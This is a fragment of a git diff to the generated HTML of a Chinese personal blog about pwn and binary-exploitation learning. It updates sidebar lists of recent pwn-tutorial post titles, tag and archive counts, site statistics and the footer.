href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-unix%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3/" title="c语言回炉重造-unix系统接口">c语言回炉重造-unix系统接口</a><time datetime="2023-11-12T07:29:52.000Z" title="发表于 2023-11-12 15:29:52">2023-11-12</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/8/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/#content-inner">8</a><span class="page-number current">9</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-55-iofile入门之vtable劫持"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持">pwn入门-55-iofile入门之vtable劫持</a><time datetime="2024-02-11T08:43:00.000Z" title="发表于 2024-02-11 16:43:00">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用"><img src="/img/background/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-54-exit_hook函数利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用">pwn入门-54-exit_hook函数利用</a><time datetime="2024-02-11T08:01:29.000Z" title="发表于 2024-02-11 16:01:29">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析"><img src="/img/background/5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-53-glibc之malloc源码分析"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析">pwn入门-53-glibc之malloc源码分析</a><time datetime="2024-02-11T05:40:56.000Z" title="发表于 2024-02-11 13:40:56">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop"><img src="/img/background/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-52-iofile结合特殊gadget进行rop"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop">pwn入门-52-iofile结合特殊gadget进行rop</a><time datetime="2024-02-10T12:22:28.000Z" title="发表于 2024-02-10 20:22:28">2024-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用"><img src="/img/background/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-51-_IO_obstack_jumps利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用">pwn入门-51-_IO_obstack_jumps利用</a><time datetime="2024-02-10T12:21:41.000Z" title="发表于 2024-02-10 20:21:41">2024-02-10</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
             <i class="fas fa-folder-open"></i>
             <span>分类</span>
             <a class="card-more-btn" href="/categories/" title="查看更多">
@@ -245,8 +727,8 @@ More info: Deployment
             </div>
             <ul class="card-category-list" id="aside-cat-list">
             <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
-            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(3, 28, 152)">路由器</a><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(102, 149, 62)">旅游</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(171, 108, 177)">浏览器安全</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(151, 116, 80)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(193, 154, 94)">C语言</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(79, 172, 99)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(76, 182, 113)">堆</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(1, 80, 95)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(105, 83, 5)">脚本</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(84, 72, 100)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(111, 47, 26)">诗歌</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(181, 61, 20)">调试</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(177, 104, 34)">论文</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(198, 62, 176)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(154, 109, 76)">USENIX</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">83</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-08T12:37:15.099Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(121, 6, 28)">路由器</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(67, 70, 118)">浏览器安全</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(11, 51, 139)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(138, 174, 136)">C语言</a><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(62, 80, 156)">旅游</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(45, 48, 41)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(138, 124, 101)">堆</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(43, 40, 115)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(69, 196, 67)">脚本</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(169, 191, 92)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(140, 123, 58)">诗歌</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(121, 96, 199)">调试</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(79, 74, 122)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(41, 176, 83)">USENIX</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(200, 167, 109)">论文</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">88</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-11T08:49:49.619Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By 唐仔橙</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
   if (true) { 
     window.typed = new Typed("#subtitle", {
       strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
